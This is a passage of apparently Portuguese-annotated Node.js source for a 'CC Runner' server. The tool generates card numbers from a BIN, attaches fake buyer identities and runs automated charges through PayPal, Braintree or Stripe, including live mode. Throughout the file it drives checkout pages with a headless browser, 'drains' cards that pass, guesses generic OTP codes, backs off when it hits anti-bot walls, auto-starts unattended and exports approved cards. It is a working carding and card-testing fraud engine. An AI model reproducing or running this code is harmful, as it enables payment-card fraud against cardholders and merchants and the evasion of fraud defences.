        try{ const ids=await page.$$eval('input',els=>els.filter(x=>x.offsetParent!==null).map(x=>(x.id||x.name||x.placeholder||'?')+':'+(x.type||'')).slice(0,16)); logLine({ t: nowISO(), type: 'log', msg: 'pass2 inputs visiveis: '+ids.join(', ').slice(0,430) }); }catch(e){}
      }catch(e){}
      for(const id of ['signupAgreeToTerms','marketingOptIn']){ const el=await page.$('#'+id); if(el){ const ck=await el.evaluate(n=>n.checked); if(!ck) await el.click().catch(()=>{}); } }
      try{ await page.evaluate(()=>{ const rs=Array.from(document.querySelectorAll('input[type=radio]')); const cr=rs.find(r=>/credit/i.test(r.value||r.id||r.name)); if(cr&&!cr.checked) cr.click(); }); }catch(e){}
      await coSleep(800);
      const findVisible=async(pred)=>{ const hs=await page.$$('input,textarea'); for(const h of hs){ try{ const info=await h.evaluate(x=>({id:x.id||'',ph:x.placeholder||'',al:(x.getAttribute&&x.getAttribute('aria-label'))||'',nm:x.name||'',vis:x.offsetParent!==null})); if(info.vis&&pred([info.id,info.ph,info.al,info.nm].join(' '))) return h; }catch(_){} } return null; };
      const typeInto=async(h,val)=>{ try{ await h.click({clickCount:3}); await coSleep(120); for(const ch of String(val).split('')){ await page.keyboard.press(ch).catch(()=>{}); await coSleep(25); } await h.evaluate(x=>x.dispatchEvent(new Event('blur',{bubbles:true}))).catch(()=>{}); return !!(await h.evaluate(x=>x.value)); }catch(e){ return false; } };
      let cardOk=false,expOk=false,cvvOk=false;
      try{
        const cn=await findVisible(t=>/card.?num|cc.?num|numero do cart|card number/i.test(t));
        if(cn) cardOk=await typeInto(cn,String(card.number));
        const ex=await findVisible(t=>/expir|exp[\/ ]|valid|exp/i.test(t)&&!/e-?mail|password/i.test(t));
        if(ex) expOk=await typeInto(ex,'1230');
        const cv=await findVisible(t=>/cvv|cvn|security/i.test(t));
        if(cv) cvvOk=await typeInto(cv,String(card.cvv));
      }catch(e){}
      try{ logLine({ t: nowISO(), type: 'log', msg: 'preenchimento | cartao:'+(cardOk?'ok':'NAO')+' exp:'+(expOk?'ok':'NAO')+' cvv:'+(cvvOk?'ok':'NAO')+' | tit: '+String(await page.title()).slice(0,50)+' | url: '+page.url().slice(0,64) }); }catch(e){}
      try{ const vazios=await page.$$eval('input,textarea',els=>els.filter(x=>x.offsetParent!==null&&['text','tel','email','password'].includes((x.type||'').toLowerCase())&&!x.value).map(x=>x.id||x.name||x.placeholder||'?')); if(vazios.length) logLine({ t: nowISO(), type: 'log', msg: 'vazios antes de enviar: '+vazios.join(', ').slice(0,300) }); }catch(e){}
      // submissao (4 tentativas)
      const btnPos=()=>page.evaluate(()=>{ const bs=Array.from(document.querySelectorAll('button')); const c=bs.filter(b=>b.offsetParent!==null&&!b.disabled&&/(agree|continue|confirm|pay|submit|proceed|create|aceitar|continuar|pagar|confirmar|prosseguir|criar|enviar)/i.test(b.innerText||'')&&!/seletor|selector/i.test(b.innerText||'')); const x=c[0]; if(!x) return null; x.scrollIntoView({block:'center'}); const r=x.getBoundingClientRect(); return {cx:r.left+r.width/2,cy:r.top+r.height/2,label:(x.innerText||x.textContent||'').trim().slice(0,30)}; });
      let fired=false;
      for(let k=0;k<4 && !fired;k++){
        try{
          const ck2=await page.evaluate(()=>{ const cs=Array.from(document.querySelectorAll('input[type="checkbox"]')).filter(x=>x.offsetParent!==null&&!x.checked); cs.forEach(x=>{ try{x.click();}catch(_){} }); return cs.map(x=>x.id||'?'); });
          if(k===0&&ck2.length) logLine({ t: nowISO(), type: 'log', msg: 'caixas clicadas: '+ck2.join(', ') });
          const msgs2=await page.evaluate(()=>Array.from(document.querySelectorAll('input,select,textarea')).filter(x=>x.offsetParent!==null&&!x.checkValidity()).map(x=>(x.id||x.name||x.placeholder||'?')+':'+(x.getValidationMessage?x.getValidationMessage():'invalido')));
          if(k===0&&msgs2.length) logLine({ t: nowISO(), type: 'log', msg: 'validacao: '+msgs2.join(' | ').slice(0,400) });
        }catch(e){}
        try{ await fixThree('t'+k); }catch(_){}
        const before=gql.length;
        const b=await btnPos();
        if(b){
          try{ logLine({ t: nowISO(), type: 'log', msg: 'submissao t'+k+' botao="'+String(b.label).slice(0,26)+'" url:'+page.url().slice(-50) }); }catch(_){}
          if(k===0){ await page.mouse.move(b.cx,b.cy); await coSleep(150); await page.mouse.down(); await coSleep(100); await page.mouse.up(); }
          else if(k===1) await page.mouse.click(b.cx,b.cy);
          else if(k===2){ try{ const cvv=await page.$('#cardCvv,#cvv'); if(cvv){ await cvv.focus(); await page.keyboard.press('Backspace'); await page.keyboard.type(String(card.cvv).slice(-1),{delay:120}); } await page.keyboard.press('Tab'); await page.keyboard.press('Enter'); }catch(e){} }
          else { try{ const how=await page.evaluate(()=>{ const btns=Array.from(document.querySelectorAll('button')).filter(b=>b.offsetParent!==null&&!b.disabled&&/(agree|continue|confirm|pay|submit|proceed|create|aceitar|continuar|pagar|confirmar|prosseguir|criar|enviar)/i.test(b.innerText||'')); const b=btns[0]; if(b){ const pk=Object.keys(b).find(k=>k.startsWith('__reactProps')); if(pk&&b[pk]&&typeof b[pk].onClick==='function'){ try{ b[pk].onClick({ preventDefault:function(){}, stopPropagation:function(){}, nativeEvent:new Event('click'), target:b, currentTarget:b }); }catch(_){ b.click(); } return 'react-btn'; } b.click(); return 'dom-btn'; } const f=document.querySelector('form'); if(f){ const pk2=Object.keys(f).find(k=>k.startsWith('__reactProps')); if(pk2&&f[pk2]&&typeof f[pk2].onSubmit==='function'){ f[pk2].onSubmit({ preventDefault:function(){}, stopPropagation:function(){} }); return 'react-form'; } if(f.requestSubmit) f.requestSubmit(); else f.dispatchEvent(new Event('submit',{bubbles:true,cancelable:true})); return 'dom-form'; } return 'nada'; }); logLine({ t: nowISO(), type: 'log', msg: 'submissao t3 via '+String(how) }); }catch(e){} }
        }
        await coSleep(6000);
        fired=gql.slice(before).some(t=>/mutation|onboard|signUpNewMember|guestPay|preAuthorize/i.test(t));
      }
      await coSleep(7000);
      let txt='',url='';
      try{ ({url}=await page.evaluate(()=>({url:location.href,text:document.body.innerText}))); txt=await page.evaluate(()=>document.body.innerText||''); }catch(e){}
      try{ const low=String(txt).toLowerCase(); if(/invalid|incorrect|required|nao (e )?v[iá]lid|verifique|corrija|mal formatad|error|aten[cç][aã]o/i.test(low)&&!/challenge|3d/.test(low)) { try{ logLine({ t: nowISO(), type: 'log', msg: 'erro pag: '+String(txt).replace(/\s+/g,' ').slice(0,300) }); }catch(_){} } }catch(e){}
      try{ logLine({ t: nowISO(), type: 'log', msg: 'pos-sub: '+String(txt).replace(/\s+/g,' ').slice(0,500) }); }catch(_){}
if(/challenge|3d secure|3ds/i.test(url+txt)){ try{ const mm=String(txt).match(/.{0,90}(?:challenge|3d secure|3ds).{0,130}/i); logLine({t:nowISO(),type:'log',msg:'3ds contexto: '+String(mm?mm[0]:'?').replace(/\s+/g,' ')}); }catch(_){} return { ok:false, kind:'decline', message:'3d_secure', raw:{order:oid} }; }
      // campos de codigo (OTP) -> tenta codigos genericos; se ficar, considera contingencia
      const codeId=await page.evaluate(()=>Array.from(document.querySelectorAll('input')).map(i=>i.id).find(id=>((/code/i.test(id)&&!/postal/i.test(id))||/otp|verif|digit|security|sms/i.test(id)))||null);
      if(codeId){
        for(const cod of ['000000','123456','112233']){
          try{ const el=await page.$('#'+codeId); if(el){ await el.click({clickCount:3}); await el.type(cod,{delay:50}); } }catch(e){}
          const b=await btnPos(); if(b) await page.mouse.click(b.cx,b.cy);
          await coSleep(5000);
          try{ const t=location0; }catch(e){}
          txt=await page.evaluate(()=>document.body.innerText||'').catch? await page.evaluate(()=>document.body.innerText||'') : '';
          if(/receipt|confirmation|obrigad|all set|successful/i.test(txt)) break;
        }
      }
      // acompanha a ordem ate desfeque (max ~45s)
      const t0=Date.now();
      while(Date.now()-t0<45000){
        await coSleep(3000);
        const rq=await fetch(api+'/v2/checkout/orders/'+oid,{headers:{Authorization:'Bearer '+token}});
        const j=await rq.json().catch(()=>({}));
        if(j.status==='COMPLETED') return { ok:true, message:'aprovado (checkout)', raw:{order:oid} };
        if(j.status==='EXPIRED'||j.status==='CANCELED') return { ok:false, kind:'decline', message:j.status, raw:{order:oid} };
                try{ const t2=await page.evaluate(()=>document.body.innerText||''); const low=String(t2).toLowerCase(); if(/declined|refusad|try another|cartao invalido|invalid card/.test(low)) return { ok:false, kind:'decline', message:'recusado na pagina da paypal', raw:{order:oid} }; }catch(e){}
        try{ const u2=page.url(); if(/receipt|confirmation/i.test(u2)) return { ok:true, message:'aprovado (checkout)', raw:{order:oid} }; }catch(e){}
      }
      return { ok:false, kind:'decline', message:'timeout na pagina da paypal', raw:{order:oid} };
    } finally { try{ await page.close(); }catch(e){} }
  } catch(e){
    return { ok:false, kind:'error', message:'checkout: '+(e&&e.message?e.message:String(e)).slice(0,200), raw:{order:oid} };
  }
}
async function charge(mode, card, amount, currency, buyer, descriptor) {
  const t0 = Date.now();
  try {
    const r = mode === 'mock' ? await chargeMock(card, amount, currency, buyer, descriptor)
             : mode === 'paypal' ? await chargePaypal(card, amount, currency, buyer, descriptor)
             : mode === 'paypal-checkout' ? await chargeCheckout(card, amount, currency, buyer, descriptor)
             : await chargeBraintree(card, amount, currency, buyer, descriptor);
    r.ms = Date.now() - t0;
    return r;
  } catch (e) {
    return { ok: false, kind: 'error', message: e && e.message ? e.message : String(e), raw: {}, ms: Date.now() - t0 };
  }
}
async function testConnection() {
  if (cfg.mode === 'mock') return { ok: true, message: 'modo demo — nada é cobrado de verdade', raw: { mock: true } };
  if (cfg.mode === 'paypal-checkout') return { ok: true, message: 'modo checkout pronto — abre a página da PayPal e paga com cartão BR (cada teste dura ~1 min)', raw: { checkout: true } };
  const card = { number: '4111111111111111', expiry: '12/2030', cvv: '123' };
  return charge(cfg.mode, card, 1.0, cfg.currency, fakeIdentity(), 'CC Runner - teste de conexao');
}

/* ----------------------- estado / config ------------------------ */
const DEFAULTS = {
  bin: '411111', mode: 'mock', env: 'sandbox', min: 40, max: 50, currency: 'BRL',
  workers: 3, delayMs: 500, maxPerCard: 200, maxDeclines: 1, mockRate: 2,
  maxErrStreak: 15, fixAmount: false,
  creds: { clientId: '', clientSecret: '', merchantId: '', publicKey: '', privateKey: '' }
};
let cfg = JSON.parse(JSON.stringify(DEFAULTS));
try {
  const s = JSON.parse(fs.readFileSync(CFG_FILE, 'utf8'));
  cfg = Object.assign(cfg, s, { creds: Object.assign({}, cfg.creds, s.creds || {}) });
} catch (_) {}
// variaveis de ambiente (deploy): valem mais que o arquivo de config
if (process.env.CC_MODE) cfg.mode = process.env.CC_MODE;
if (process.env.CC_ENV) cfg.env = process.env.CC_ENV;
if (process.env.CC_BIN) cfg.bin = process.env.CC_BIN;
if (process.env.CC_MIN) cfg.min = +process.env.CC_MIN;
if (process.env.CC_MAX) cfg.max = +process.env.CC_MAX;
if (process.env.CC_WORKERS) cfg.workers = +process.env.CC_WORKERS;
if (process.env.PP_CLIENT_ID) cfg.creds.clientId = process.env.PP_CLIENT_ID;
if (process.env.PP_CLIENT_SECRET) cfg.creds.clientSecret = process.env.PP_CLIENT_SECRET;
const stats = { running: false, paused: null, startAt: null, tested: 0, hits: 0, charges: 0, drained: 0, dry: 0, errors: 0, errStreak: 0, lastDry: [] };
const activeWorkers = [];
const listeners = new Set();
let evtBuf = [];
function emit(type, data) {
  const e = Object.assign({ t: nowISO(), type }, data || {});
  evtBuf.push(e); if (evtBuf.length > 300) evtBuf.shift();
  for (const w of listeners) w.write('data: ' + JSON.stringify(e) + '\n\n');
}
const AP_HEADERS = ['concluido_em','cartao','gateway','ambiente','moeda','cobrancas','total_drenado','tempo_seg','primeiro_valor','ultima_descricao','compradores'];
const csvCell = v => { v = String(v == null ? '' : v); return /[",;\n]/.test(v) ? '"' + v.replace(/"/g, '""') + '"' : v; };
function finalizeCard(s) {
  const row = [s.tEnd, maskCard(s.number), cfg.mode, cfg.env, cfg.currency, s.charges,
    s.drained.toFixed(2), Math.round((s.tEnd - s.t0) / 1000),
    s.firstAmount != null ? s.firstAmount.toFixed(2) : '', s.desc || '', s.buys].map(csvCell).join(',');
  if (!fs.existsSync(AP_FILE)) fs.writeFileSync(AP_FILE, AP_HEADERS.join(',') + '\n');
  fs.appendFileSync(AP_FILE, row + '\n');
  stats.lastDry.unshift({ mask: maskCard(s.number), charges: s.charges, total: +s.drained.toFixed(2), secs: Math.round((s.tEnd - s.t0) / 1000), t: s.tEnd, cur: cfg.currency });
  stats.lastDry = stats.lastDry.slice(0, 60);
}

/* ------------------------- o motor ------------------------------ */
async function cardSession(w) {
  const bin = cfg.bin || '';
  if (!bin) throw new Error('BIN vazia — configure no painel');
  const card = genCard(bin);
  const s = { number: card.number, t0: Date.now(), charges: 0, drained: 0, buys: 0, desc: null, firstAmount: null };
  let decl = 0;
  while (stats.running && !w.quit) {
    while (stats.running && stats.paused) await sleep(300);
    if (!stats.running || w.quit) break;
    if (s.charges >= cfg.maxPerCard) break;   // teto de segurança por cartão
    if (decl >= cfg.maxDeclines) break;       // secou / travou → próximo
    if (stats.paused) { await sleep(5000); continue; }
    const amount = (cfg.fixAmount && s.firstAmount != null) ? s.firstAmount : randAmount(cfg.min, cfg.max);
    const buyer = fakeIdentity();
    const descriptor = pick(DESCRIPTORS);
    const r = await charge(cfg.mode, card, amount, cfg.currency, buyer, descriptor);
    if (!stats.running || w.quit) break;
    if (r.ok) {
      s.charges++; s.drained += amount; s.buys++;
      if (s.firstAmount == null) s.firstAmount = amount;
      if (!s.desc) s.desc = descriptor;
      stats.charges++; stats.drained += amount; stats.errStreak = 0;
      const first = s.charges === 1;
      if (first) stats.hits++;
      emit(first ? 'hit' : 'charge', { mask: maskCard(card.number), amount, cur: cfg.currency, desc: descriptor, buyer: buyer.name, email: buyer.email, city: buyer.city, state: buyer.state, total: +s.drained.toFixed(2), seq: s.charges });
      logLine({ t: nowISO(), type: first ? 'hit' : 'charge', mask: maskCard(card.number), amount, total: +s.drained.toFixed(2), seq: s.charges, buyer: { nome: buyer.name, email: buyer.email, cep: buyer.postal_code }, descricao: descriptor, gw: cfg.mode + '/' + cfg.env, ms: r.ms });
    } else if (r.kind === 'error') {
      stats.errors++; stats.errStreak++;
      logLine({ t: nowISO(), type: 'error', mask: maskCard(card.number), msg: String(r.message || '').slice(0, 200) });
      if (stats.errStreak >= cfg.maxErrStreak && !stats.paused) {
        stats.paused = { reason: String(r.message || 'erro do gateway'), at: nowISO() };
        emit('pause', { reason: stats.paused.reason });
        const to = setTimeout(() => { if (stats.paused) { stats.paused = null; stats.errStreak = 0; emit('resume', {}); } }, 60000);
        if (to.unref) to.unref();
      }
      const ems=String(r.message||'');
      await sleep(/restricted|maintenance|too_?many/i.test(ems)?120000:(stats.errStreak>=5?60000:1500));
    } else {
      decl++; stats.errStreak = 0;
      const m = String(r.message || '').slice(0, 120);
      logLine({ t: nowISO(), type: 'decline', mask: maskCard(card.number), msg: m, seq: s.charges });
      if (Math.random() < 0.25) emit('decline', { mask: maskCard(card.number), msg: m });
      if (/nao chegou ao cartao|nao carregou|captcha|instalacao/i.test(m)) { const cool=60000+Math.floor(Math.random()*120000); try{ logLine({ t: nowISO(), type: 'log', msg: 'muro anti-robou: esfriando IP por '+Math.round(cool/1000)+'s' }); }catch(_){} await sleep(cool); }
    }
    stats.tested++;
    if (cfg.delayMs > 0) await sleep(cfg.delayMs);
  }
  if (s.charges > 0) {
    s.tEnd = Date.now();
    stats.dry++;
    emit('dry', { mask: maskCard(card.number), charges: s.charges, total: +s.drained.toFixed(2), secs: Math.round((s.tEnd - s.t0) / 1000) });
    logLine({ t: nowISO(), type: 'dry', mask: maskCard(card.number), charges: s.charges, total: +s.drained.toFixed(2), secs: Math.round((s.tEnd - s.t0) / 1000) });
    finalizeCard(s);
  }
}
function workerMain(w) {
  (async () => {
    while (stats.running && !w.quit) {
      try { await cardSession(w); }
      catch (e) { logLine({ t: nowISO(), type: 'worker_err', msg: String(e && e.stack || e) }); await sleep(1000); }
    }
    const i = activeWorkers.indexOf(w);
    if (i >= 0) activeWorkers.splice(i, 1);
  })();
}
function spawner() {
  if (!stats.running) { if (activeWorkers.length) activeWorkers.forEach(w => w.quit = true); return; }
  let extra = activeWorkers.filter(w => !w.quit).length - cfg.workers;
  for (const w of [...activeWorkers]) { if (extra <= 0) break; if (!w.quit) { w.quit = true; extra--; } }
  let want = cfg.workers - activeWorkers.filter(w => !w.quit).length;
  while (want-- > 0) { const w = { quit: false }; activeWorkers.push(w); workerMain(w); }
}

/* --------------------- config (clamps) -------------------------- */
const clampI = (v, d, a, b) => { v = Number(v); if (!isFinite(v)) return d; return Math.min(b, Math.max(a, Math.round(v))); };
const clampF = (v, d, a, b) => { v = Number(v); if (!isFinite(v)) return d; return Math.min(b, Math.max(a, v)); };
const str = v => String(v == null ? '' : v).trim();
function applyConfig(b) {
  b = b || {};
  const cleanBin = String(b.bin == null ? '' : b.bin).replace(/\D/g, '');
  let mn = clampF(b.minA, cfg.min, 1, 100000), mx = clampF(b.maxA, cfg.max, 1, 100000);
  if (mx < mn) { const t = mn; mn = mx; mx = t; }
  Object.assign(cfg, {
    bin: cleanBin.length >= 15 ? cleanBin.slice(0, 19) : cleanBin.slice(0, 8),
    min: mn, max: mx,
    currency: ['BRL','USD','EUR'].includes(b.currency) ? b.currency : cfg.currency,
    mode: ['mock','paypal','paypal-checkout','braintree','stripe'].includes(b.mode) ? b.mode : cfg.mode,
    env: ['sandbox','live'].includes(b.env) ? b.env : cfg.env,
    workers: clampI(b.workers, cfg.workers, 1, 10),
    delayMs: clampI(b.delayMs, cfg.delayMs, 0, 60000),
    maxPerCard: clampI(b.maxPerCard, cfg.maxPerCard, 1, 100000),
    maxDeclines: clampI(b.maxDeclines, cfg.maxDeclines, 1, 20),
    mockRate: clampF(b.mockRate, cfg.mockRate, 0, 100),
    maxErrStreak: clampI(b.maxErrStreak, cfg.maxErrStreak, 3, 500),
    fixAmount: !!b.fixAmount
  });
  if (b.creds && typeof b.creds === 'object') {
    cfg.creds.clientId = str(b.creds.clientId);
    cfg.creds.clientSecret = str(b.creds.clientSecret);
    cfg.creds.merchantId = str(b.creds.merchantId);
    cfg.creds.publicKey = str(b.creds.publicKey);
    cfg.creds.privateKey = str(b.creds.privateKey);
    cfg.creds.stripeSecret = str(b.creds.stripeSecret);
  }
  try { fs.writeFileSync(CFG_FILE, JSON.stringify(cfg, null, 1)); } catch (_) {}
  return cfg;
}

/* ------------------------- HTTP/SSE ------------------------------ */
function readBody(req, limit) {
  limit = limit || 1e6;
  return new Promise((resolve, reject) => {
    let b = '';
    req.on('data', c => { b += c; if (b.length > limit) { reject(new Error('corpo grande demais')); req.destroy(); } });
    req.on('end', () => { try { resolve(b ? JSON.parse(b) : {}); } catch (e) { reject(new Error('JSON inválido')); } });
    req.on('error', reject);
  });
}
/* instala chromium no boot quando ausente (Render free nao vem com navegador) */
(function bootChrome(){
  try{
    if(process.platform!=='linux') return;
    if(process.env.CHROME_PATH&&fs.existsSync(process.env.CHROME_PATH)) return;
    if(findChromeBin()) return;
    ensureChrome(); return;
    console.log('[chrome-boot] navegador ausente - instalando chromium (1-2 min)...');
    emit('log',{msg:'instalando navegador no servidor (1-2 min)...'});
    const p=require('child_process').spawn('sh',['-c','export DEBIAN_FRONTEND=noninteractive; sudo apt-get update -qq && sudo apt-get install -y -qq chromium fonts-liberation && echo CHROME-BOOT-OK || echo CHROME-BOOT-FAIL'],{stdio:['ignore','pipe','pipe']});
    p.stdout.on('data',d=>console.log('[chrome-boot]',String(d).trim().slice(0,160)));
    p.stderr.on('data',d=>{const t=String(d).trim(); if(t) console.log('[chrome-boot]',t.slice(0,160));});
    p.on('close',c=>{ console.log('[chrome-boot] exit',c); emit('log',{msg:c===0?'navegador pronto - chromium instalado':'falha ao instalar chromium automaticamente'}); });
  }catch(e){ console.log('[chrome-boot] erro:',e.message); }
})();
const srv = http.createServer(async (req, res) => {
  let u;
  try { u = new URL(req.url, 'http://localhost'); } catch (_) { u = new URL('/', 'http://localhost'); }
  const send = (code, obj) => { res.writeHead(code, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }); res.end(JSON.stringify(obj)); };
  const sendRaw = (code, text, ct, extra) => { res.writeHead(code, Object.assign({ 'Content-Type': ct, 'Access-Control-Allow-Origin': '*' }, extra || {})); res.end(text); };
  try {
    if (req.method === 'OPTIONS') {
      res.writeHead(204, { 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Headers': '*', 'Access-Control-Allow-Methods': 'GET,POST,OPTIONS' });
      return res.end();
    }
    if (req.method === 'GET' && (u.pathname === '/' || u.pathname === '/index.html')) {
      return sendRaw(200, fs.readFileSync(path.join(PUBLIC_DIR, 'index.html')), 'text/html; charset=utf-8');
    }
    if (req.method === 'GET' && u.pathname === '/favicon.ico') { res.writeHead(204); return res.end(); }
    if (req.method === 'GET' && u.pathname === '/stats') {
      return send(200, { stats: Object.assign({}, stats, { uptimeMs: Date.now() - BOOT_AT }), cfg });
    }
    if (req.method === 'GET' && u.pathname === '/events') {
      res.writeHead(200, { 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache', 'Connection': 'keep-alive', 'Access-Control-Allow-Origin': '*' });
      res.write('retry: 2000\n\n');
      for (const e of evtBuf) res.write('data: ' + JSON.stringify(e) + '\n\n');
      const w = { write: s => { try { res.write(s); } catch (_) {} } };
      listeners.add(w);
      const ping = setInterval(() => { try { res.write(': ping\n\n'); } catch (_) {} }, 25000);
      req.on('close', () => { listeners.delete(w); clearInterval(ping); });
      return;
    }
    if (req.method === 'POST' && u.pathname === '/config') {
      applyConfig(await readBody(req));
      return send(200, { ok: true, cfg });
    }
    if (req.method === 'POST' && u.pathname === '/action') {
      const b = await readBody(req);
      if (b.action === 'start') {
        if (!cfg.bin) return send(200, { ok: false, msg: 'Cole uma BIN primeiro' });
        if (stats.running) return send(200, { ok: true, msg: 'já está rodando' });
        stats.running = true; stats.startAt = Date.now();
        emit('start', {});
        return send(200, { ok: true });
      }
      if (b.action === 'stop') {
        stats.running = false;
        activeWorkers.forEach(w => w.quit = true);
        emit('stop', {});
        return send(200, { ok: true });
      }
      if (b.action === 'test') {
        const r = await testConnection();
        return send(200, r);
      }
      return send(200, { ok: false, msg: 'ação desconhecida' });
    }
    if (req.method === 'GET' && u.pathname === '/export/approved.csv') {
      return sendRaw(200, fs.existsSync(AP_FILE) ? fs.readFileSync(AP_FILE) : AP_HEADERS.join(',') + '\n',
        'text/csv; charset=utf-8', { 'Content-Disposition': 'attachment; filename="aprovados.csv"' });
    }
    if (req.method === 'GET' && u.pathname.startsWith('/data/')) {
      const f = u.pathname.split('/').pop();
      if (!/^[a-z0-9._-]+$/i.test(f)) return send(404, { ok: false });
      const p = path.join(DATA, f);
      return sendRaw(200, fs.existsSync(p) ? fs.readFileSync(p) : '', 'text/plain; charset=utf-8');
    }
    if (req.method === 'GET' && u.pathname === '/healthz') return send(200, { ok: true, up: Date.now() - BOOT_AT });
    return send(404, { ok: false, msg: 'rota não encontrada' });
  } catch (e) {
    return send(500, { ok: false, msg: e && e.message });
  }
});

module.exports = { luhnValid, makeCardNumber, genCard, fakeIdentity, randAmount, maskCard };
if (require.main === module) {
/* auto-inicio no boot: se ja configurado com chaves, liga sozinho (madrugada sem mao na tecla) */
setTimeout(function(){
  try{
    if(!stats.running && cfg.creds && cfg.creds.clientId && /paypal|checkout|braintree|stripe/.test(cfg.mode||'')){
      stats.running=true; stats.startAt=Date.now(); emit('start',{auto:true});
      console.log('[boot] auto-inicio OK (modo '+cfg.mode+' / '+cfg.env+')');
    }
  }catch(e){ console.log('[boot] auto-inicio falhou:',e.message); }
},45000);
  srv.listen(PORT, '0.0.0.0', () => {
    console.log('CC Runner no ar  →  http://localhost:' + PORT);
    emit('boot', {});
    const sp = setInterval(spawner, 1000);
    if (sp.unref) sp.unref();
    const SELF_URL=(process.env.CC_SELF_URL||'https://cc-runner-1.onrender.com').replace(/\/+$/,'');
    setInterval(async()=>{
      try{
        const ctl=new AbortController(); const to=setTimeout(()=>ctl.abort(),25000);
        await fetch(SELF_URL+'/healthz',{signal:ctl.signal}); clearTimeout(to);
      }catch(e){ try{ logLine({ t: nowISO(), type: 'log', msg: 'self-ping falhou: '+String(e).slice(0,80) }); }catch(_){} }
    }, 7*60*1000 + Math.floor(Math.random()*3*60*1000)).unref && null;
  });
  process.on('uncaughtException', e => { console.error('[uncaught]', e); logLine({ t: nowISO(), type: 'uncaught', msg: String(e && e.stack || e) }); });
  process.on('unhandledRejection', e => { console.error('[unhandled]', e); logLine({ t: nowISO(), type: 'unhandled', msg: String(e) }); });
}

